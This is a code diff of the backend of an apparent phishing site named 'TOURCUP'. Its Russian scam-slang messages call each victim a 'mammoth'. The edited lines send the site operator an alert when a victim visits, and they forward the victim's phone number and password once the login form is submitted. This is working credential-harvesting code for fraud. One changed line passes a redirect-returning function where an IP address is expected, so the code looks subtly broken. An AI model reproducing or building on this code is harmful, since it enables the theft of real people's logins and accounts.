@@ -11,10 +11,6 @@ websiteName = "TOURCUP"
 
 
 
-LOG_MESSAGE = f'💳 Мамонт ввёл данные 💳 \n\n 🌐 Ip мамонта: {user_agent} \n\n 📱Номер телефона: {number} \n 💻Пароль: {password}\n'
-
-
-
 
 
 
@@ -75,7 +71,7 @@ def tracker():
         "AhrefsBot"
     ]
 
-    send(f"{shortNick(user_agent, 80)} — {url}")
+    send(f"🗳 Мамонт зашел на сайт \n\n {shortNick(user_agent, 80)} — {url}")
 
     return redirect("/")
 
@@ -107,7 +103,8 @@ def page():
     elif len(number) < 9 or len(password) < 6:
         return render_template('auth.html', error = "Заполните поля правильно!")
 
-    send(f'💳 Мамонт ввёл данные 💳 \n\n 🌐 Ip мамонта: {user_agent} \n\n 📱Номер телефона: {number} \n 💻Пароль: {password}\n')
+
+    send(f'💳 Мамонт ввёл данные 💳 \n\n 🌐 Ip мамонта: {tracker()} \n\n 📱Номер телефона: {number} \n 💻Пароль: {password}\n')
 
     return redirect("/")
 
